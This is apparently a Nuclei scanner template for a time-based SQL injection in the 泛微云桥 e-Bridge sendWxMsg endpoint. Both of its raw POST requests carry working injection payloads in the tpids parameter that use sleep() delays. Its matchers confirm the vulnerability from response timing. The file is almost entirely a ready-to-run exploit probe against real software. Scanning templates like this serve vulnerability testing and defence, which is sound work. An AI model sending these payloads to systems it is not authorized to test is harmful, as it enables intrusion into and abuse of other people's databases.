id: weaverE-Bridge-sendWxMsg-sql

info:
  name: 泛微云桥 e-Bridge sendWxMsg 存在SQL注入漏洞
  author: weaverE
  severity: high
  tags: weaverE

http:
  - raw:
      - |
        POST /wxthirdapi/sendWxMsg HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
        Accept: */*
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate, br
        Content-Type: application/x-www-form-urlencoded
        Connection: close

        userids=-1&tpids=1%27+or+%28select+%2A+from+%28select+sleep%282%29%29x%29+or+%27x%27%3D%27x

      - |
        POST /wxthirdapi/sendWxMsg HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
        Accept: */*
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate, br
        Content-Type: application/x-www-form-urlencoded
        Connection: close

        userids=-1&tpids=1%27+or+%28select+%2A+from+%28select+sleep%284%29%29x%29+or+%27x%27%3D%27x

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: dsl
        dsl:
          - 'duration_1>=2 && duration_1<4'  
          - 'duration_2>=4 && duration_2<6'
        condition: and
